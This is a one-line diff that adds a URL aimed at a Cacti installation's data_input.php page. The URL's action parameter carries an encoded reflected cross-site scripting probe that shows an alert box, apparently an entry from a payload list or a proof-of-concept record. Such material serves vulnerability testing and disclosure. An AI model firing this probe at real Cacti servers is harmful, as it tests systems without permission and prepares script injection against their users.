@@ -1,0 +1,1 @@
+http://example.com/cacti/data_input.php?action=&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;
